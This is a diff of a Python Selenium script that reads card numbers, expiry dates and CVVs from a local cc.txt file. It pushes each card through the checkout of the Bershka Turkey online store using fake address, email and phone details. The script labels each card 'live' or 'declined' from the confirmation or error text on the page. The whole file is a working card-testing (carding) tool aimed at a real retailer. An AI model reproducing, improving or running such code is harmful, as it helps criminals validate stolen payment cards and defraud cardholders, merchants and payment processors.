@@ -6,8 +6,6 @@ from http import client
 from time import sleep
 from typing import BinaryIO, Text
 from colorama import Fore, Back, Style, init
-
-
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
@@ -23,7 +21,7 @@ from selenium.webdriver.support.wait import WebDriverWait
 
 
 def funct():
-    CCList = open(r'C:\Users\kahbe\Desktop\New folder\cc.txt', "r", encoding="utf8").read().splitlines()
+    CCList = open(r'/home/kali/Masaüstü/Register User/cc.txt', "r", encoding="utf8").read().splitlines()
     kartlar = []
 
     for i in CCList:
@@ -49,7 +47,7 @@ options.add_argument('--disable-gpu')
 options.add_argument('--ignore-certificate-errors')
 options.add_argument('--no-sandbox')
 #options.add_argument('--headless')
-driver = webdriver.Chrome(executable_path=r'C:\Users\kahbe\Desktop\New folder\chromedriver.exe', options=options)
+driver = webdriver.Chrome(executable_path=r'/home/kali/Masaüstü/Register User/chromedriver', options=options)
 driver.set_window_size(360,640)
 #driver = webdriver.Firefox(profile, options=options)
 wait = WebDriverWait(driver, 25, poll_frequency=1)
@@ -58,9 +56,9 @@ while True:
 
         print('Starting ..')
         driver.delete_all_cookies()
-        driver.get("https://www.bershka.com/tr/8-k%C4%B1l%C4%B1f%C4%B1-c0p103018449.html?colorId=512")
+        driver.get("https://www.bershka.com/tr/8-k%C4%B1l%C4%B1f%C4%B1-c0p103091543.html?colorId=512")
         sleep(2)
-        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#onetrust-close-btn-container > button'))).click()
+        wait.until(EC.presence_of_element_located((By.ID, 'onetrust-close-btn-container'))).click()
         wait.until(
         EC.presence_of_element_located((By.CSS_SELECTOR, '.button-text'))).click()
         #driver.find_element_by_css_selector('.button-text').click()
@@ -80,7 +78,7 @@ while True:
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").click()
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys("limkd3ert")
         driver.find_element_by_name("email").click()
-        driver.find_element_by_name("email").send_keys("ka3532s39et@mail.com")
+        driver.find_element_by_name("email").send_keys("ka35d32s39et@mail.com")
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").click()
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").send_keys("5344443565")
         driver.find_element_by_xpath("//*[@id='summary-wrapper']/div/div[2]/div/div/cta-checkout/div/div/div[2]/div").click()
@@ -148,28 +146,40 @@ while True:
             tikli = True
             driver.find_element_by_css_selector(".ellipsis").click()
             driver.execute_script("window.scrollTo(0,0)")
-            sleep(3)            
+            sleep(4)            
                  #print(EC.presence_of_element_located(By.CSS_SELECTOR, '.checkout--error--2RoAR > .checkout--right-col--1y9nm > span')).text
                  #print(EC.presence_of_element_located(By.CSS_SELECTOR, '.checkout--error--2RoAR > div:nth-child(2) > span:nth-child(1)')).text
             hata2 = ('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.')
             hata1 = ('Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')
             hata3 = ('Transaction not completed. Enter the expiry date on your card')
-            try: 
-                if driver.find_element(By.CSS_SELECTOR, ".message").text:
-                    print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
-                elif driver.find_element(By.CSS_SELECTOR, "#iPageContent > div.checkoutWrapper.checkout-confirmation > div.confirmation > div.confirmation-thank").text:
-                    print(Fore.GREEN +"Live kart "," :",cc,"|",mm,"|",yy,"|",cvv,)
-                else :
-                    print(Fore.RED + '!!! -HATA OLDU AQ- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)     
+            #try: 
+            #    if 
+                
+            sleep(4)
+            #cikti = driver.find_element(By.CSS_SELECTOR, ".message")
+            if 'Siparişiniz için çok teşekkür ederiz' in driver.page_source:
+                print(Fore.GREEN +"LİVE KART NO"," :", cc,"|",mm,"|",yy,"|",cvv,)
+                #print(cikti.text) 
+            elif 'Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.' in driver.page_source: 
+                print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
+            elif 'Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.' in driver.page_source: 
+                print(Fore.RED +"PROGRAMI RESTART ET !"," :", cc,"|",mm,"|",yy,"|",cvv,)
+            elif 'Transaction not completed. Enter the expiry date on your card' in driver.page_source:
+                print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
+                #    print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
+                #elif driver.find_element(By.CSS_SELECTOR, "#iPageContent > div.checkoutWrapper.checkout-confirmation > div.confirmation > div.confirmation-thank").text:
+                #    print(Fore.GREEN +"Live kart "," :",cc,"|",mm,"|",yy,"|",cvv,)
+                #else :
+                #    print(Fore.RED + '!!! -HATA OLDU AQ- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)     
              #driver.find_element_by_xpath("//p[contains(.,'Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')]" or "//p[contains(.,'Transaction not completed. Enter the expiry date on your card')]")
              #print('--İşlem reddedildi-- : ',cc,"|",mm,"|",yy,"|",cvv,)
-                driver.find_element_by_css_selector(".ui-button").click()
+            driver.find_element_by_css_selector(".ui-button").click()
              #('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.'):
                  #print('!!! -HATA OLDU- !!! : ',cc,"|",mm,"|",yy,"|",cvv,) 
-            except:
-                print(Fore.RED + '!!! -HATA OLDU- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)
-                driver.refresh()
-                driver.refresh()
-                tikli = False
-                sleep(1)
-                continue
+            #except:
+            #print(Fore.RED + '!!! -HATA OLDU- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)
+            #driver.refresh()
+            #driver.refresh()
+            #tikli = False
+            #sleep(2)
+             #  continue
